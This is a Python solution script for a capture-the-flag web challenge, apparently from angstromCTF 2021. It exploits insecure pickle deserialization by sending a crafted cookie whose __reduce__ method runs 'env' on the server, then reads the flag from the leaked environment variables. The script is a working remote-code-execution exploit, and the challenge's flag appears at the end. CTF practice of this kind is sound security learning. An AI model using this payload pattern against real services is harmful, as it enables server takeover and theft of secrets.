# Web application is vulnerable to a deserialization attack
# https://medium.com/@abhishek.dev.kumar.94/sour-pickle-insecure-deserialization-with-python-pickle-module-efa812c0d565
import os
import pickle
import requests
import base64
import subprocess

# Class returns output of env when deserialized
class MyEvilPickle(object):
    def __reduce__(self):
        return (subprocess.check_output, ('env', ))

# Wrap class in list so we can append things serverside
pickle_data = pickle.dumps([MyEvilPickle()])

# Handle encoding and remove b''
pickle_data = str(base64.b64encode(pickle_data))
pickle_data = pickle_data[2:-1]

url = "https://jar.2021.chall.actf.co/"

# Contents cookie will be deserialized on server
cookie = dict(contents=pickle_data)
session = requests.Session()
r = session.post(url+"/add", cookies=cookie, data={"item":"lol_hax"})

# Get and parse returned cookies
env_vars = session.cookies.get_dict()["contents"]
env_vars =  pickle.loads(base64.b64decode(env_vars))
env_vars = str(env_vars[0]).split("\\n")
# Find and print flag
for i in env_vars:
    if "actf{" in i:
        print(i)
# actf{you_got_yourself_out_of_a_pickle}
